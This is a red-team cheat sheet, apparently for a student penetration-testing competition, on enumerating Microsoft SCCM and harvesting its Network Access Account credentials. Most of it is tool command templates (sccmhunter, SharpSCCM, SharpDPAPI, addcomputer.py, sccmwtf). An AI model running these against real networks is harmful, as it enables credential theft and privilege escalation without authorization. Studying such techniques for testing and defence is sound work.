# SCCM

SCCM (now MECM and previously SMS) is the System Center Configuration Manager.

It is an on-prem AD-integrated solution that aims to handle path management, task automation, remote control, and often is joined with OS deployment (through PXE). 

There is now a cloud native version from MS called Intune

* CPTC has historically made "trendy" vulns a big part of that year's competition (which is why I have a separate document for SCCM).
	* CHECK THE COMMITS,,, I PUSHED BEFORE THE DEADLINE 

**Important Definitions**:

* Site Server: The server that hosts the SCCM site
	* Will always have a 3-letter site code
* Network Access Account (NAA)
	* Used to authenticate to the SCCM server if the machine isn't domain-joined yet
	* This is widely used, but is not required. Enhanced HTTP is a more secure alternative
* Client Push Installation Accounts (Push Account)
* (WSUS) 
* Operating System Deployment (OSD)
	* SCCM can deploy windows onto multiple machines at once through PXE (Network Boot)
	* This happens through a PXE server, which happens through a "wim" file
	* There should be a password requested when the installer is run - but this is often not the case
	* After network boot, the OS image will be transferred via HTTP and installed. The machine will then be domain joined and programs will be configured

## Enumeration

Linux:

* [**PXEThief**](https://github.com/MWR-CyberSec/PXEThief)

* [**sccmhunter**](https://github.com/garrettfoster13/sccmhunter)

`python3 sccmhunter.py find -u <low_priv_user> -p <pass> -d <domain> -dc-ip <dc ip>`

`python3 sccmhunter.py smb -u <low_priv_user> -p <pass> -d <domain> -dc-ip <dc ip>`


`python3 sccmhunter.py show -users`

`python3 sccmhunter.py show -computers`

Windows:

* Go to `Control panel > Configuration Manager`
	* If SCCM is on the domain, you'll see an assigned management point and a site code

`.\SharpSCCM.exe local site-info`


## Privilege Escalation

### Credential Harvesting

**NAA**:
* If you are a local admin on the SCCM client

Linux:
`SystemDPAPIdump.py <domain>/<low_priv_user>:'<password>'@<server>`

Windows:
`.\SharpSCCM get secrets`

`.\SharpSCCM local secrets -m wmi`

`.\SharpDPAPI SCCM`

* If you are not a local admin, you can make a machine account (all non-privileged users can make 10 machine accounts by default)

`addcomputer.py <domain>/<low_priv_user>:'<password>' -dc-ip <dc ip>`

* [**sccmwtf**](https://github.com/xpn/sccmwtf)

`sccmwtf.py <new machine hostname> <new machine fqdn> <sccm site server hostname (use fqdn in /etc/hosts if not resolving)> '<domain>\<new machine hostname>$' '<new machine password>`

`.\sccm-decrypt.exe <CDATA>`
	
### 


## Lateral Movement

